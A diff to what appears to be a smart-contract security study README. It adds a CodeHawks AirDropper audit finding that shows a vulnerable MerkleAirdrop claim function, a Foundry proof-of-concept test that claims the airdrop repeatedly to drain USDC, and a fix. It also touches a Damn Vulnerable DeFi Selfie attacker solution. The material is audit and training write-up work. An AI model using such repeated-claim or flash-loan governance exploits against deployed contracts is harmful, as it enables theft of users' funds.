@@ -42,6 +42,8 @@
 - [Challenges solved](#challenges-solved)
   - [Damn Vulnerable DeFi](#damn-vulnerable-defi)
     - [Selfie](#selfie) 
+  - [Cyfrin CodeHawks First Flights](#cyfrin-codeHawks-first-flights)
+    - [First Flight #14: AirDropper H-02. Lack of a claim verification mechanism in the function MerkleAirdrop::claim results in the USDC protocol balance draining](#first-flight-14-airdropper-h-02-lack-of-a-claim-verification-mechanism-in-the-function-merkleairdropclaim-results-in-the-usdc-protocol-balance-draining)
 
 ## Introduction
 
@@ -956,6 +958,10 @@ Resources:
 
 Issue: the function `emergencyExit(address receiver)` in the `SelfiePool` contract transfers the entire balance of the contract to the specified address. By using a flash loan to acquire the necessary voting power, it is possible to queue the action `emergencyExit(address)` targeting a specific address, in this case `recovery`. After queuing the action, wait for the required delay before calling `executeAction(actionId)` to meet the conditions. This will transfer the contract’s balance to the specified address.
 
+<details>
+
+<summary>Solution</summary>
+
 ```Solidity
 ...
 import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
@@ -1031,3 +1037,96 @@ contract SelfieAttacker is IERC3156FlashBorrower {
     }
 }
 ```
+
+</details>
+
+### Cyfrin CodeHawks First Flights
+
+#### [First Flight #14: AirDropper](https://codehawks.cyfrin.io/c/2024-04-airdropper) H-02. Lack of a claim verification mechanism in the function `MerkleAirdrop::claim` results in the USDC protocol balance draining
+
+**Summary**
+
+The `claim` function in the MerkleAirdrop contract enables eligible users to claim their 25 USDC airdrop. However, the current implementation of the `MerkleAirdrop.sol` contract lacks a mechanism to prevent users from claiming the airdrop multiple times in the `MerkleAirdrop::claim` function, which could lead to draining the contract's USDC balance.
+
+<details>
+
+<summary>Affected code</summary>
+
+Here is the following code afftected by the vulnerability: [MerkleAirdrop.sol#L30-L40)]((https://github.com/Cyfrin/2024-04-airdropper/blob/main/src/MerkleAirdrop.sol#L30-L40))
+
+```Solidity
+    function claim(address account, uint256 amount, bytes32[] calldata merkleProof) external payable {
+        if (msg.value != FEE) {
+            revert MerkleAirdrop__InvalidFeeAmount();
+        }
+        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(account, amount))));
+        if (!MerkleProof.verify(merkleProof, i_merkleRoot, leaf)) {
+            revert MerkleAirdrop__InvalidProof();
+        }
+        emit Claimed(account, amount);
+        i_airdropToken.safeTransfer(account, amount);
+    }
+```
+
+</details>
+
+<details>
+
+<summary>Proof of Code</summary>
+
+Add the following test to the `MerkleAirdropTest.t.sol` test suite.
+
+```Solidity
+    function testUsersCanClaimMultipleTimes() public {
+        uint256 startingBalance = token.balanceOf(collectorOne);
+        vm.deal(collectorOne, airdrop.getFee() * 4);
+
+        vm.startPrank(collectorOne);
+        for (uint i = 0; i < 4; i++) {
+            airdrop.claim{value: airdrop.getFee()}(
+                collectorOne,
+                amountToCollect,
+                proof
+            );
+        }
+        vm.stopPrank();
+
+        uint256 endingBalance = token.balanceOf(collectorOne);
+        assertEq(endingBalance - startingBalance, amountToSend);
+    }
+```
+
+</details>
+
+**Solution**
+
+Add a verification mechanism to make sure that an user can claim only its airdrop. An example is the following:
+
+<details>
+
+<summary>Code</summary>
+
+```diff
++    error MerkleAirdrop__AirdropAlreadyClaimed();
++    mapping(address => bool) private claimed; // Track claimed status
+...
+
+    function claim(address account, uint256 amount, bytes32[] calldata merkleProof) external payable {
+        if (msg.value != FEE) {
+            revert MerkleAirdrop__InvalidFeeAmount();
+        }
+        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(account, amount))));
+        if (!MerkleProof.verify(merkleProof, i_merkleRoot, leaf)) {
+            revert MerkleAirdrop__InvalidProof();
+        }
++       if (claimed[account]) { // Check if user already claimed
++           revert MerkleAirdrop__AirdropAlreadyClaimed();
++       }
++       claimed[account] = true; // Mark user as claimed
+        emit Claimed(account, amount);
+        i_airdropToken.safeTransfer(account, amount);
+    }
+
+```
+
+</details>
